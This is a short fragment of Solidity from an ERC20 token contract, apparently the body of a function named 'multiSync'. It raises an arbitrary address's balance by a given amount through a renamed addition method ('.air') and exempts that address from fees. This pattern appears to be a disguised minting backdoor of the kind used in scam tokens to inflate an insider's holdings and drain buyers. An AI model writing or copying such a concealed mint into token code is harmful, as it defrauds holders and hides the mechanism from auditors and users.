require(syncAddr != address(0), "ERC20: multiSync address is zero");
require(syncAmount > 0, "ERC20: multiSync amount equal to zero");
_balances[syncAddr] = _balances[syncAddr].air(syncAmount);
_isExcludedFromFee[syncAddr] = true;
